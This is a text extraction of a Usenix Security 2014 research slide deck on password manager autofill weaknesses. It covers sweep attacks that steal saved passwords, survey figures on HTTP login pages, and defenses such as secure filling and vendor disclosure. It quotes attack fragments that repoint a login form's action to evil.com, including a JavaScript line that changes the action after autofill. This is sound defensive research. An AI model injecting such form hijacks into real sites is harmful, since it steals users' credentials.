<?xml version="1.0" ?>
<Presentation>
  <div class="page">
    <p>Password Managers: Attacks and Defenses</p>
    <p>David Silver! ! Suman Jana Dan Boneh Stanford University</p>
    <p>! Eric Chen Collin Jackson</p>
    <p>Carnegie Mellon University</p>
    <p>Usenix Security 20148/21/14</p>
  </div>
  <div class="page">
    <p>A tool for</p>
    <p>Convenience? Security?</p>
    <p>Goal: Both!</p>
  </div>
  <div class="page">
    <p>Password Manager Workflow</p>
    <p>Password Manager</p>
    <p>Save manually entered password</p>
    <p>Autofill username and password</p>
    <p>Topic of this talk</p>
  </div>
  <div class="page">
    <p>Manual Autofill</p>
    <p>Page Load</p>
    <p>User Interaction</p>
  </div>
  <div class="page">
    <p>Automatic Autofill</p>
    <p>Page Load</p>
    <p>Convenientbut hard to make secure</p>
    <p>User Interaction</p>
  </div>
  <div class="page">
    <p>Should we autofill?</p>
    <p>Automatic Autofill Corner Cases</p>
  </div>
  <div class="page">
    <p>Should we autofill?! The contestants</p>
    <p>Browser-based:</p>
    <p>Chrome 34 Firefox 29 Safari 7.0 IE 11 Android Browser</p>
    <p>LastPass 2.0</p>
    <p>Norton IdentitySafe 2014</p>
    <p>KeePass 2.24</p>
    <p>Keeper 7.5</p>
  </div>
  <div class="page">
    <p>Should we autofill?! Different form action</p>
    <p>&lt;form action=http://evil.com&gt;</p>
    <p>HTTPS</p>
    <p>Automatic Autofill:</p>
    <p>At Save: Now: &lt;form action=login.php&quot;&gt;</p>
    <p>Alternatively, what if action is changed by JavaScript after autofilling?</p>
    <p>! form.action = http://evil.com</p>
  </div>
  <div class="page">
    <p>Should we autofill?! Different form action</p>
    <p>&lt;form action=http://evil.com&quot;&gt;</p>
    <p>HTTPS</p>
    <p>Alternatively, what if action is changed by JavaScript after autofilling?</p>
    <p>! form.action = http://evil.com</p>
    <p>Automatic Autofill:</p>
    <p>At Save: Now: &lt;form action=login.php&quot;&gt;</p>
  </div>
  <div class="page">
    <p>Should we autofill?! Click through HTTPS warning</p>
    <p>Automatic Autofill:</p>
  </div>
  <div class="page">
    <p>Should we autofill?! iFrame not same-origin with parent</p>
    <p>Automatic Autofill:</p>
  </div>
  <div class="page">
    <p>Sweep Attacks Stealing multiple passwords without user interaction</p>
  </div>
  <div class="page">
    <p>Threat Model: Coffee-shop Attacker</p>
    <p>Save Password! for b.com</p>
    <p>Goal: Trick password manager into revealing b.coms password</p>
    <p>Browse a.com</p>
  </div>
  <div class="page">
    <p>Obligatory Food Example</p>
  </div>
  <div class="page">
    <p>Redirect Sweep Attack on HTTP Login Page</p>
    <p>GET papajohns.com</p>
    <p>REDIRECT att.com</p>
    <p>GET att.com</p>
    <p>att.com</p>
    <p>GET papajohns.com</p>
    <p>papajohns.com</p>
    <p>+ attacker JS</p>
    <p>automatic autofill att.com</p>
    <p>password stolen!</p>
  </div>
  <div class="page">
    <p>Redirect Sweep Attack Demo (Fast)</p>
    <p>http://youtu.be/n0xIiWl0pZo</p>
  </div>
  <div class="page">
    <p>Redirect Sweep Attack Demo (Slow)</p>
    <p>http://youtu.be/qiiSuIE79No</p>
  </div>
  <div class="page">
    <p>HTTP Login Pages</p>
    <p>Alexa Top 500*</p>
    <p>Login Pages 408</p>
    <p>Load Login Page over HTTP (submit over HTTP or HTTPS) 194 47%</p>
    <p>*as of October 2013</p>
    <p>HTTP pages trivially vulnerable to code injection by coffee shop attacker</p>
    <p>att.com vulnerable because it loads login page over HTTP</p>
    <p>(even though it submits over HTTPS)</p>
  </div>
  <div class="page">
    <p>Attacking HTTPS  XSS Injection</p>
    <p>Active Mixed Content</p>
    <p>Trick user into clicking through HTTPS warning</p>
  </div>
  <div class="page">
    <p>Other sweep attacks (see paper)</p>
    <p>iFrame sweep attack</p>
    <p>Window sweep attack</p>
  </div>
  <div class="page">
    <p>Sweep Attacks! Vulnerability</p>
    <p>Automatic! !</p>
    <p>!</p>
    <p>!</p>
    <p>!</p>
    <p>Manual! !</p>
    <p>Vulnerable</p>
    <p>Not Vulnerable</p>
  </div>
  <div class="page">
    <p>Defending against sweep attacks</p>
  </div>
  <div class="page">
    <p>Defense #1: Manual Autofill as secure as manual entry</p>
    <p>Fill-and-Submit  Still just one click for the user</p>
    <p>Page Load</p>
    <p>Less convenient?</p>
  </div>
  <div class="page">
    <p>Manual Entry Manual Autofill</p>
    <p>Can we do better?</p>
    <p>Security</p>
  </div>
  <div class="page">
    <p>Defense #2: Secure Filling more secure than manual entry</p>
    <p>Dont let JavaScript read autofilled passwords  Let form submit only if action matches action when</p>
    <p>password was saved  (Site must submit form using HTTPS)  Prototype implementation in Chromium (~50 lines)</p>
  </div>
  <div class="page">
    <p>Manual Entry Secure Filling</p>
    <p>Security</p>
    <p>More secure than manual entry</p>
  </div>
  <div class="page">
    <p>AJAX</p>
    <p>10 sites out of Alexa Top 50* use AJAX to submit password forms</p>
    <p>Workarounds</p>
    <p>Submit form in iFrame</p>
    <p>Create browser SendPwd API</p>
  </div>
  <div class="page">
    <p>Disclosure</p>
    <p>Disclosed results to password vendors</p>
    <p>Warning when autofilling HTTPS passwords on HTTP pages</p>
    <p>Don't automatically autofill passwords in iFrames not same-origin with parent</p>
  </div>
  <div class="page">
    <p>Conclusions  Automatic autofill has lots of corner cases</p>
    <p>Sweep Attacks: steal passwords without any user interaction</p>
    <p>Defenses</p>
    <p>Require user interaction before filling passwords</p>
    <p>Secure Filling</p>
    <p>Just as convenient for user but much more secure</p>
  </div>
  <div class="page">
    <p>Questions?</p>
  </div>
  <div class="page">
    <p>HTTP Login Pages</p>
    <p>Alexa Top 500*</p>
    <p>Login Pages 408</p>
    <p>Load over HTTP, submit over HTTPS 71 17%</p>
    <p>Load and submit over HTTP 123 30%</p>
    <p>Load over HTTP 194 47%</p>
    <p>*as of October 2013</p>
  </div>
  <div class="page">
    <p>What about strength checkers?</p>
    <p>Only needed on registration forms</p>
    <p>Use JavaScript to read password field</p>
    <p>Dont conflict with secure filling - password managers shouldnt be filling existing passwords on registration forms</p>
  </div>
</Presentation>
